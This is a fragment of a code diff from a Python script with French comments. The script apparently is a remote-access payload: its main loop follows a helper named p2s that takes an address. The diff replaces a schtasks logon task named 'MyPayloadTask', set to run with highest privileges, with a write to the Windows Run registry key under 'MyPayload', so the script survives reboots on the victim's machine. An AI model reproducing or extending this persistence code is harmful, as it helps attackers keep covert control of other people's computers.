@@ -25,18 +25,18 @@ def p2s(s, p, addr):
 
 def add_to_startup():
     try:
-        # Chemin complet du script Python
+    # Chemin complet du script Python
         script_path = os.path.abspath(__file__)
         
-        # Commande schtasks pour créer une tâche planifiée
-        task_name = "MyPayloadTask"
-        cmd = f'schtasks /create /tn {task_name} /tr "{script_path}" /sc onlogon /rl highest /f'
+        # Clé du registre pour l'exécution au démarrage
+        key = reg.HKEY_CURRENT_USER
+        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         
-        # Exécuter la commande
-        subprocess.call(cmd, shell=True)
+        key_obj = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
+        reg.SetValueEx(key_obj, "MyPayload", 0, reg.REG_SZ, script_path)
+        reg.CloseKey(key_obj)
     except Exception as e:
         print(f"Error adding to startup: {e}")
-
 def main():
     add_to_startup()  # Ajouter le script au démarrage
     while True:
